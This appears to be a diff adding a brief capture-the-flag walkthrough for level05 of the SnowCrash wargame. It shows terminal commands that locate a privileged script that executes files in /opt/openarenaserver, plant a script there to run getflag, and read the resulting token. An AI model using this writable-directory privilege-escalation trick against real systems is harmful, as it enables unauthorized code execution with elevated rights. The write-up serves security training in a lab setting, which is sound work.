@@ -1,0 +1,24 @@
+level05@SnowCrash:~$ find / -user flag05  2> /dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+
+level05@SnowCrash:~$ ls -lah /usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+
+We create a script in /opt/openarenaserver/ that will get us the flag:
+echo 'bash -c "getflag > /tmp/level04_flag"' > /opt/openarenaserver/level04.sh
+
+After some time, the script is executed by openarenaserver and deleted, and we get the flag in /tmp/level04_flag
+
+level05@SnowCrash:~$ cat /tmp/level04_flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
